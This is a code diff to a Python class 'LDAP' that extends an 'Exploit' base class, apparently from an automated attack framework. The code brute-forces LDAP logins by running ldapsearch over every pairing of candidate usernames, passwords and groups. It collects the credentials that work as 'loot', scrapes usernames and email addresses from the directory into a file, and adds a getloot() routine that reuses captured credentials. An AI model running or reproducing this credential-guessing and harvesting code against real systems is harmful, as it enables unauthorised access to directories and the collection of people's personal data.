@@ -16,28 +16,25 @@ class LDAP(Exploit):
         domainstring = ','.join(['dc='+x for x in self.domain.split('.')])
 
         captured_usernames = []
-        captured_emailids = []
         successful_loot = []
 
         # sample command: ldapsearch -H ldap://localhost -x -D cn=admin,ou=admins,dc=glauth,dc=com -w dogood -b dc=glauth,dc=com
         for username, password, group in it.product(usernames, passwords, common_groups):
-            command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
-                      f' -w {password} -b {domainstring}').split()
-            result = subprocess.run(command, capture_output=True, text=True)
-            captured_output = result.stdout
-            captured_err = result.stderr
+            captured_output, captured_err = self.run_ldapsearch(ip_address, username, group, domainstring, password)
             if captured_err or not captured_output:
                 continue
-            new_usernames, new_emailids = self.process_output(captured_output)
+            new_usernames = self.process_output(captured_output)
             successful_loot.append((username, password))
             captured_usernames.extend(new_usernames)
-            captured_emailids.extend(new_emailids)
-        if captured_emailids:
-            with open('data/emailids.lst', 'a+') as f:
-                f.write('\n'.join(captured_emailids) + '\n')
         to_return = successful_loot + [(x, None) for x in captured_usernames]
         print(to_return)
         return to_return
+
+    def run_ldapsearch(self, ip_address, username, group, domainstring, password):
+        command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
+                      f' -w {password} -b {domainstring}').split()
+        result = subprocess.run(command, capture_output=True, text=True)
+        return result.stdout, result.stderr
 
     def process_output(self, output):
         usernames, emailids = [], []
@@ -47,8 +44,27 @@ class LDAP(Exploit):
             if line.startswith('cn: '):
                 usernames.append(line[4:])
             if line.startswith('mail: '):
-                emailids.append(line[6:])            
-        return usernames, emailids
+                emailids.append(line[6:])      
+        # save email IDs, skipping duplicates
+        if emailids:
+            with open('data/emailids.lst', 'r') as f:
+                old_emails = set(f.read().split())
+            all_emails = old_emails.union(set(emailids))
+            with open('data/emailids.lst', 'w+') as f:
+                f.write('\n'.join(all_emails) + '\n')      
+        return usernames
 
     def getloot(self, ip_address, credentials):
-        print('currently in getloot()')
+        common_groups = ['admins', 'users']
+        domainstring = ','.join(['dc='+x for x in self.domain.split('.')])
+        captured_usernames = []
+        for group in common_groups:
+            for username, password in credentials:
+                if not username or not password:
+                    continue
+                captured_output, captured_err = self.run_ldapsearch(ip_address, username, group, domainstring, password)
+                if captured_err or not captured_output:
+                    continue
+                new_usernames = self.process_output(captured_output)
+                captured_usernames.extend(new_usernames)
+        return [(u, None) for u in captured_usernames]
